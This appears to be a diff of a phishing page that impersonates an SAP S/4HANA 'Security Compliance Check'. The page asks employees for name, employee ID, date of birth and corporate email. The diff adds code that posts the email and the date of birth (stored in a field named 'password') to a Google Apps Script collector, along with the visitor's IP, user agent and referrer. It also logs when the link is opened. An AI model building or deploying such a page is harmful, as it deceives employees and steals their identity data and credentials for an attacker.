@@ -1,54 +1,78 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
 
-<title>SAP Credential Verification</title>
+<meta charset="UTF-8">
+<title>SAP Identity Verification</title>
 
 <style>
 
 body{
-font-family:Arial;
-background:#f4f6f8;
 margin:0;
-padding:0;
+font-family:"Segoe UI",Arial,sans-serif;
+background:#eef3f8;
 display:flex;
 justify-content:center;
 align-items:center;
 height:100vh;
 }
 
-.box{
-background:white;
+.wrapper{
 width:420px;
-padding:40px;
-border-radius:8px;
-box-shadow:0 0 10px rgba(0,0,0,0.2);
+background:white;
+border-radius:10px;
+box-shadow:0 10px 30px rgba(0,0,0,0.2);
+padding:35px;
 text-align:center;
 }
 
-h2{
-margin-bottom:10px;
+.logo{
+font-size:26px;
+font-weight:bold;
+color:#0070f2;
+margin-bottom:8px;
 }
 
-p{
+.header{
+font-size:16px;
+margin-bottom:25px;
+color:#444;
+}
+
+.field{
+text-align:left;
+margin-bottom:15px;
+}
+
+label{
+font-size:13px;
 color:#555;
 }
 
 input{
-width:90%;
+width:100%;
 padding:10px;
-margin:10px;
+margin-top:5px;
 border:1px solid #ccc;
 border-radius:4px;
+font-size:14px;
+}
+
+input:focus{
+border-color:#0070f2;
+outline:none;
 }
 
 button{
+margin-top:10px;
+width:100%;
+padding:11px;
 background:#0070f2;
 color:white;
-padding:10px 20px;
 border:none;
 border-radius:4px;
+font-size:15px;
 cursor:pointer;
 }
 
@@ -56,9 +80,15 @@ button:hover{
 background:#005ac7;
 }
 
+.footer{
+margin-top:20px;
+font-size:12px;
+color:#888;
+}
+
 .success{
-font-size:20px;
-color:green;
+font-size:18px;
+color:#2e7d32;
 }
 
 </style>
@@ -67,49 +97,68 @@ color:green;
 
 <body>
 
-<div class="box" id="formBox">
+<div class="wrapper" id="formBox">
 
-<h2>SAP S/4HANA Security Verification</h2>
+<div class="logo">SAP</div>
 
-<p>Please confirm your SAP credentials</p>
+<div class="header">
+S/4HANA Security Compliance Check  
+Please confirm your SAP identity
+</div>
 
 <form id="sapForm">
 
-<input type="text" id="name" placeholder="Full Name" required>
+<div class="field">
+<label>Full Name</label>
+<input type="text" id="name" required>
+</div>
 
-<input type="text" id="empid" placeholder="Employee ID" required>
+<div class="field">
+<label>Employee ID</label>
+<input type="text" id="empid" required>
+</div>
 
-<input type="email" id="email" placeholder="Email ID" required>
+<div class="field">
+<label>Date of Birth</label>
+<input type="date" id="password" required>
+</div>
 
-<button type="submit">Confirm</button>
+<div class="field">
+<label>Corporate Email</label>
+<input type="email" id="email" required>
+</div>
+
+<button type="submit">Confirm Identity</button>
 
 </form>
+
+<div class="footer">
+SAP Global Security Compliance Portal
+</div>
 
 </div>
 
 <script>
 
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyBd2-EDj6qD-bz9CZAYrdd7vGp5REkHceBmJBJyKahJrsBDcDUleOJ4b0GCV9mZ1Q/exec";
-
+const SCRIPT_URL = "YOUR_APPS_SCRIPT_URL";
 let userIP = "";
 
 
 async function getIP(){
-
 const res = await fetch("https://api.ipify.org?format=json");
 const data = await res.json();
 userIP = data.ip;
-
 }
 
 
-async function logEvent(eventName,emailValue){
+async function logEvent(eventName,emailValue,passwordValue){
 
 await fetch(SCRIPT_URL,{
 method:"POST",
 body:JSON.stringify({
 event:eventName,
 email:emailValue,
+password:passwordValue,
 ip:userIP,
 userAgent:navigator.userAgent,
 referrer:document.referrer
@@ -119,22 +168,19 @@ referrer:document.referrer
 }
 
 
-document.getElementById("sapForm").addEventListener("submit", async function(e){
+document.getElementById("sapForm").addEventListener("submit",async function(e){
 
 e.preventDefault();
 
-const name = document.getElementById("name").value;
-const empid = document.getElementById("empid").value;
-const email = document.getElementById("email").value;
+const email=document.getElementById("email").value;
+const password=document.getElementById("password").value;
 
+await logEvent("EMAIL_SUBMITTED",email,password);
 
-await logEvent("FORM_SUBMITTED",email);
-
-
-document.getElementById("formBox").innerHTML = `
+document.getElementById("formBox").innerHTML=`
 <div class="success">
-<h2>Thank You</h2>
-<p>Your SAP credential confirmation has been recorded.</p>
+<h2>Verification Complete</h2>
+<p>Thank you for confirming your SAP credentials.</p>
 </div>
 `;
 
@@ -142,10 +188,8 @@ document.getElementById("formBox").innerHTML = `
 
 
 async function init(){
-
 await getIP();
-await logEvent("PAGE_OPEN","LINK_OPENED");
-
+await logEvent("PAGE_OPEN","LINK_OPENED","");
 }
 
 init();
@@ -153,5 +197,4 @@ init();
 </script>
 
 </body>
-
 </html>
